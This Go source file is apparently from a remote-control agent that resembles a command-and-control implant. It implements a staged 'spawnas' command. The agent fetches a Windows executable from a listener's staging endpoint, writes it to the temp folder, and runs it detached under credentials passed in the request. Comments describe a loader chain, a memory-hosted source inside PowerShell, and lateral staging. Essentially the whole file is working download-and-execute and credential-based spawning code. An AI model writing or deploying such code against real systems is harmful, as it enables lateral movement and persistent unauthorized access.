package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// SPAWNAS_STAGED_COMMAND is the staged-artifact variant of __SPAWNAS__. The
// new wire name is deliberate: an older agent must reject the request
// instead of ignoring the new fields and relaunching this process's image
// (which, inside a loader host, names the PowerShell host binary).
const SPAWNAS_STAGED_COMMAND = "__SPAWNAS_STAGED__"

// spawnasStagedPayload carries a __SPAWNAS_STAGED__ command's JSON body: the
// identity fields of the legacy spawn contract plus the server-staged
// deployment artifact reference the loader chain already uses.
type spawnasStagedPayload struct {
	spawnasPayload
	Stage          string  `json:"stage"`
	PayloadSHA256  string  `json:"payload_sha256"`
	TimeoutSeconds float64 `json:"timeout_seconds"`
}

// parseSpawnasStagedPayload validates the staged spawnas request. The stage
// reference and digest follow the loader chain's rules so the fetch stays
// single-use, masked, and digest-checked.
func parseSpawnasStagedPayload(command string) (spawnasStagedPayload, error) {
	var payload spawnasStagedPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := rejectCommandDebugOption([]byte(parts[1])); err != nil {
		return payload, err
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	base, err := parseSpawnasPayload(command)
	if err != nil {
		return payload, err
	}
	payload.spawnasPayload = base
	if !agentSessionIDPattern.MatchString(payload.Stage) {
		return payload, errors.New("staged spawnas requires a staging reference from the listener")
	}
	if !lateralSHA256Pattern.MatchString(payload.PayloadSHA256) {
		return payload, errors.New("staged spawnas requires the staged payload SHA-256")
	}
	if payload.TimeoutSeconds <= 0 {
		payload.TimeoutSeconds = 120
	}
	if payload.TimeoutSeconds > 3600 {
		payload.TimeoutSeconds = 3600
	}
	return payload, nil
}

// spawnasStagedAgentPath names the session-scoped on-disk image for the
// spawned agent. The fresh session id is unique per deployment and the
// caller opens the file with O_EXCL, so a second deployment can never
// overwrite an agent that is already running from this path.
func spawnasStagedAgentPath(sessionID string) (string, error) {
	if !agentSessionIDPattern.MatchString(sessionID) {
		return "", errors.New("invalid spawnas session ID")
	}
	return filepath.Join(os.TempDir(), "minimal-rmm-agent-"+sessionID+".exe"), nil
}

// writeSpawnasStagedAgent writes the fetched artifact with O_EXCL so an
// existing image is never clobbered.
func writeSpawnasStagedAgent(path string, artifact []byte) error {
	if !bytes.HasPrefix(artifact, []byte("MZ")) {
		return errors.New("staged agent payload is not a Windows executable")
	}
	file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0700)
	if err != nil {
		return fmt.Errorf("stage the spawned agent image: %w", err)
	}
	if _, err := file.Write(artifact); err != nil {
		file.Close()
		return fmt.Errorf("write the spawned agent image: %w", err)
	}
	if err := file.Close(); err != nil {
		return fmt.Errorf("close the spawned agent image: %w", err)
	}
	return nil
}

// spawnasStagedCommand handles __SPAWNAS_STAGED__: fetch the server-staged,
// workspace-owned agent build, write it to the session-scoped path, and
// start it under the requested identity with CreateProcessWithLogonW.
//
// Unlike the legacy __SPAWNAS__ wire command, this never resolves
// os.Executable(): the deployment artifact comes from the listener's
// staging endpoint, so a memory-hosted source may run it — inside a loader
// host the legacy path would relaunch powershell.exe without any agent
// capability. The created process is an ordinary on-disk agent session
// with the full command set, running under the explicit credentials and
// outliving the source. The reply contract is unchanged:
// "spawned session=<id> pid=<pid> identity=<label>".
func spawnasStagedCommand(command string, cfg *config) (string, error) {
	payload, err := parseSpawnasStagedPayload(command)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", errors.New("spawnas requires the Windows agent build")
	}
	sessionID := payload.SessionID
	if sessionID == "" {
		sessionID = derivedSessionID(cfg.SessionID, "spawnas")
	} else if !agentSessionIDPattern.MatchString(sessionID) || sessionID == cfg.SessionID {
		return "", errors.New("spawnas requires a fresh token-safe session ID")
	}
	// Session id validation runs before the artifact fetch, so an invalid
	// request never consumes the single-use staging entry.
	if payload.WorkspaceID != nil {
		if *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
			return "", errors.New("invalid spawnas workspace ID")
		}
	}
	artifact, err := lateralStageFetch(cfg, payload.Stage, payload.PayloadSHA256,
		time.Duration(payload.TimeoutSeconds*float64(time.Second)))
	if err != nil {
		return "", fmt.Errorf("fetch the staged agent payload from the server: %w", err)
	}
	imagePath, err := spawnasStagedAgentPath(sessionID)
	if err != nil {
		return "", err
	}
	if err := writeSpawnasStagedAgent(imagePath, artifact); err != nil {
		return "", err
	}
	childConfig := *cfg
	if payload.WorkspaceID != nil {
		childConfig.WorkspaceID = *payload.WorkspaceID
	}
	envStrings := spawnEnvironment(&childConfig, sessionID)
	pid, err := spawnWithLogonDetached(payload.User, payload.Domain, payload.Password,
		imagePath, []string{imagePath}, envStrings)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("spawned session=%s pid=%d identity=%s",
		sessionID, pid, identityLabel(payload.Domain, payload.User)), nil
}
